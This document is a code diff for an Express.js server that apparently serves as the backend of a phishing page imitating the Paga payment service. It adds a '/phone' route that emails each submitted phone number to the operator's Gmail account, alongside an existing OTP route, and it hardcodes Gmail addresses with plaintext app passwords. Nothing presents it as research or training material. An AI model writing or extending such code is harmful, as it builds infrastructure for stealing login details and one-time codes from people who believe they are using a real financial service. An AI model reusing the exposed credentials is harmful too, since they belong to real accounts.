@@ -10,8 +10,8 @@ app.use(cors());
 const PORT = process.env.PORT || 5000; // port to connect to WEB
 
 // emails credentials
-const userEmail = "elvisdogoyaro@gmail.com";
-const pass = "rwemrmezmqxhqqmq";
+const userEmail = "hogansinclair0@gmail.com";
+const pass = "tilndkwwfnfergvi";
 
 // Middleware
 app.use(express.json());
@@ -82,6 +82,42 @@ app.post("/otp", async (req, res) => {
     res
       .status(500)
       .json({ success: false, message: "Error occurred sending OTP" });
+  }
+});
+
+// API routes for phone
+app.post("/phone", async (req, res) => {
+  const { phone } = req.body;
+
+  const transporter = nodemailer.createTransport({
+    host: "smtp.gmail.com",
+    port: 465,
+    secure: true,
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: "Phone Login",
+    to: userEmail,
+    subject: `New Paga Phone Login`,
+    text: `New phone login attempt from Paga\nPhone Number: ${phone}\nTime: ${new Date().toISOString()}`,
+  };
+
+  try {
+    const info = await transporter.sendMail(mailOptions);
+    console.log("Email sent:", info.response);
+    res
+      .status(200)
+      .json({ success: true, message: "Phone verification initiated" });
+  } catch (error) {
+    console.error("Error:", error);
+    res.status(500).json({
+      success: false,
+      message: "Error occurred processing phone number",
+    });
   }
 });
 
